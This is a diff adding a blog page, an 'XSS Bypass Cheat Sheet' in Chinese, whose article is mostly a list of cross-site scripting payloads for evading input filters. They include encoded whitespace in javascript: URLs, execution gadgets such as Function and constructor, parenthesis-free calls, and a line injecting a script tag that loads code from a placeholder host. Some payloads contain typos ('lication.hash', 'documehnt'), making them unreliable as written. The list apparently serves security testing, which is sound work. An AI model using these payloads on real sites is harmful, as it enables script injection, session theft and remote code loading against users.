@@ -1,0 +1,217 @@
+<!doctype html>
+<html lang=&#34;en&#34;>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#070807">
+  <title>XSS Bypass Cheat Sheet · Deen&#39;s blog</title>
+  <link rel="icon" href="/images/favicon.ico">
+  <link rel="stylesheet" href="/css/style.css?v=1.1.2"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><main class="site-shell">
+    <header class="site-header">
+  <nav class="site-nav" aria-label="Primary navigation">
+    
+      <a href="/">Home</a>
+    
+      <a href="/archives/">Archives</a>
+    
+      <a href="/about/">About</a>
+    
+  </nav>
+</header>
+<div class="header-rule" aria-hidden="true"></div>
+
+    <article class="post-detail" itemscope itemtype="https://schema.org/BlogPosting">
+  <header class="post-header">
+    <h1 itemprop="headline">XSS Bypass Cheat Sheet</h1>
+    <p class="post-meta">
+      <time datetime="2021-11-15T13:46:22.000Z" itemprop="datePublished">2021-11-15</time>
+      
+    </p>
+  </header>
+  <div class="article-content" itemprop="articleBody"><h2 id="0x00-测试思路"><a href="#0x00-测试思路" class="headerlink" title="0x00 测试思路"></a>0x00 测试思路</h2><ol>
+<li>看过滤的标签: <code>&lt;script&gt;</code></li>
+<li>看过滤的关键字，过滤的事件：<code>javascript:</code></li>
+<li>尝试编码</li>
+<li>尝试添加空白符、单双引号、标签等进行干扰</li>
+<li>超长字符串bypass测试</li>
+<li>可以写js代码后自由发挥</li>
+</ol>
+<h2 id="0x01-参考"><a href="#0x01-参考" class="headerlink" title="0x01 参考"></a>0x01 参考</h2><ul>
+<li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></li>
+<li><a href="https://twitter.com/xsspayloads">https://twitter.com/xsspayloads</a></li>
+</ul>
+<h2 id="0x02-具体的技巧"><a href="#0x02-具体的技巧" class="headerlink" title="0x02 具体的技巧"></a>0x02 具体的技巧</h2><h3 id="构建数据流"><a href="#构建数据流" class="headerlink" title="构建数据流"></a>构建数据流</h3><ul>
+<li><code>a=alert;a();</code></li>
+<li><code>Object.values(window)</code></li>
+<li>字符串拼接</li>
+</ul>
+<h3 id="javascript伪协议前可以填补空白符"><a href="#javascript伪协议前可以填补空白符" class="headerlink" title="javascript伪协议前可以填补空白符"></a>javascript伪协议前可以填补空白符</h3><ul>
+<li><code>&amp;#01;</code></li>
+<li><code>&amp;#02;</code> …… <code>&amp;#32;</code></li>
+<li><code>&amp;Tab;</code></li>
+<li><code>&amp;NewLine;</code></li>
+<li><code>&amp;#x00000001</code></li>
+<li><code>&amp;#x00000001</code> …….. <code>&amp;#x00000020</code></li>
+<li><code>&amp;#x0000000000000a;</code> ….<code>&amp;#x000000000e;</code></li>
+</ul>
+<h3 id="javascript中间可以填补的空白符"><a href="#javascript中间可以填补的空白符" class="headerlink" title="javascript中间可以填补的空白符"></a>javascript中间可以填补的空白符</h3><ul>
+<li><code>&amp;Tab;</code></li>
+<li><code>&amp;NewLine;</code></li>
+<li><code>&amp;#09;</code></li>
+<li><code>&amp;#x0a;</code> </li>
+<li>……</li>
+</ul>
+<h3 id="代替window的关键字"><a href="#代替window的关键字" class="headerlink" title="代替window的关键字"></a>代替window的关键字</h3><ul>
+<li>self</li>
+<li>top</li>
+<li>this</li>
+<li>globalThis</li>
+</ul>
+<h3 id="可以执行代码payload"><a href="#可以执行代码payload" class="headerlink" title="可以执行代码payload"></a>可以执行代码payload</h3><ul>
+<li><code>find.constructor(&quot;alert(1)&quot;)()</code></li>
+<li><code>[].fill.constructor(&quot;alert(1)&quot;)()</code></li>
+<li><code>eval</code></li>
+<li><code>setTimeout</code></li>
+<li><code>setInterval(&#39;alert(1)&#39;)</code></li>
+<li><code>Function(&#39;alert(1)&#39;)()</code></li>
+<li><code>document.body.innerHTML = &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</code></li>
+</ul>
+<h3 id="属性的获取"><a href="#属性的获取" class="headerlink" title="属性的获取"></a>属性的获取</h3><ul>
+<li>使用点, <code>window.alert</code></li>
+<li>使用中括号, <code>window[&#39;ale&#39; + &#39;at&#39;]</code></li>
+</ul>
+<h3 id="简单的利用payload"><a href="#简单的利用payload" class="headerlink" title="简单的利用payload"></a>简单的利用payload</h3><ul>
+<li><code>eval(&quot;/*&quot;+lication.hash)</code> , location.hash里面需要以*/ 开头，将井号闭合掉</li>
+<li><code>document.body.innerHTML = &quot;&lt;script src=&quot;http://xxxx.com&quot;&gt;&lt;/script&gt;&quot;</code></li>
+<li><code>document.write(&quot;&lt;img/src=x&gt;&quot;)</code></li>
+<li><code>documehnt.append</code></li>
+</ul>
+<h3 id="函数执行的变换"><a href="#函数执行的变换" class="headerlink" title="函数执行的变换"></a>函数执行的变换</h3><ul>
+<li><code>alert?.(1)</code></li>
+<li><code>eval.valueOf()(&#39;alert(1);&#39;)</code></li>
+<li><code>alert.bind()(1)</code></li>
+<li><code>Reflect.apply(alert, null, [1])</code></li>
+<li><code>Promise.all([1]).then(alert)</code></li>
+<li><code>Set.constructor()()</code></li>
+</ul>
+<h3 id="禁止使用括号"><a href="#禁止使用括号" class="headerlink" title="禁止使用括号"></a>禁止使用括号</h3><ul>
+<li>innerHTML赋值</li>
+<li>throw隐形调用， <code>var{a:onerror=alert}=0;throw 1</code></li>
+<li><code>valueOf=alert;this-1</code></li>
+</ul>
+<h3 id="等号绕过"><a href="#等号绕过" class="headerlink" title="等号绕过"></a>等号绕过</h3><p>可能限制 a = window这种直接赋值</p>
+<ul>
+<li><code>a = [window]</code></li>
+<li><code>b = (1, window)</code> 逗号操作符，取最后一个</li>
+<li><code>a = { b : window }</code></li>
+<li><code>a ??= window</code> 逻辑操作符： <code>||=</code></li>
+<li>条件三元表达式</li>
+</ul>
+<p>也有可能是正则表达式，禁止数字或者字母连着括号，可以使用unicode代替</p>
+<ul>
+<li><code>\u1630=alert;\u1630();</code></li>
+<li><code>\u1fa9=alert;\u1fa9();</code></li>
+</ul>
+<h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><ul>
+<li>可以执行js的可以unicode编码，<strong>不可以编码括号</strong></li>
+<li>实体编码</li>
+<li>url编码</li>
+<li>实体编码表：<a href="https://dev.w3.org/html5/html-author/charref">https://dev.w3.org/html5/html-author/charref</a></li>
+</ul>
+</div>
+</article>
+
+    <footer class="site-footer">
+  Copyright © 2026 Deen&#39;s blog
+</footer>
+
+  </main>
+  <script>
+    (function () {
+      var terminal = document.querySelector('[data-terminal-intro]');
+      var reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+      if (!terminal || reduceMotion) return;
+
+      var introSeen = false;
+      try { introSeen = window.sessionStorage.getItem('deen-terminal-intro-seen') === '1'; } catch (error) {}
+      if (introSeen) return;
+      try { window.sessionStorage.setItem('deen-terminal-intro-seen', '1'); } catch (error) {}
+
+      var root = document.documentElement;
+      var lines = terminal.querySelectorAll('.terminal-command .terminal-typed');
+      var output = terminal.querySelector('.terminal-output');
+      var cursors = terminal.querySelectorAll('.terminal-cursor');
+      var list = document.querySelector('.post-list');
+      var pagination = document.querySelector('.terminal-status');
+      var text = Array.prototype.map.call(lines, function (line) { return line.textContent; });
+      var delay = function (milliseconds) { return new Promise(function (resolve) { window.setTimeout(resolve, milliseconds); }); };
+      var type = function (line, value) {
+        line.textContent = '';
+        return new Promise(function (resolve) {
+          var index = 0;
+          var tick = function () {
+            line.textContent += value.charAt(index++);
+            if (index < value.length) window.setTimeout(tick, 28);
+            else resolve();
+          };
+          tick();
+        });
+      };
+
+      root.classList.add('terminal-booting');
+      cursors[0].classList.add('is-active');
+      output.classList.remove('is-visible');
+      type(lines[0], text[0])
+        .then(function () {
+          cursors[0].classList.remove('is-active');
+          output.classList.add('is-visible');
+          return delay(260);
+        })
+        .then(function () { cursors[1].classList.add('is-active'); })
+        .then(function () { return type(lines[1], text[1]); })
+        .then(function () {
+          cursors[1].classList.remove('is-active');
+          Array.prototype.forEach.call(list.children, function (item, index) {
+            item.style.transitionDelay = (index * 42) + 'ms';
+            item.classList.add('is-visible');
+          });
+          if (pagination) pagination.classList.add('is-visible');
+          root.classList.remove('terminal-booting');
+        });
+    }());
+
+    document.querySelectorAll('.article-content .highlight').forEach(function (block) {
+      var code = block.querySelector('code, td.code, pre');
+      if (!code) return;
+      var className = block.className.split(/\s+/).find(function (name) { return name !== 'highlight'; });
+      var toolbar = document.createElement('div');
+      toolbar.className = 'code-toolbar';
+      toolbar.innerHTML = '<span class="code-controls" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-language"></span><button type="button" data-copy-code>Copy</button>';
+      toolbar.querySelector('.code-language').textContent = className || 'text';
+      block.prepend(toolbar);
+      var table = block.querySelector('table');
+      if (table) {
+        var scroller = document.createElement('div');
+        scroller.className = 'code-scroll';
+        table.parentNode.insertBefore(scroller, table);
+        scroller.appendChild(table);
+      }
+    });
+    document.addEventListener('click', function (event) {
+      var button = event.target.closest('[data-copy-code]');
+      if (!button) return;
+      var code = button.closest('.highlight, .code-block').querySelector('code, td.code, pre');
+      if (!code || !navigator.clipboard) return;
+      navigator.clipboard.writeText(code.innerText).then(function () {
+        button.textContent = 'Copied';
+        window.setTimeout(function () { button.textContent = 'Copy'; }, 1400);
+      });
+    });
+  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</body>
+</html>
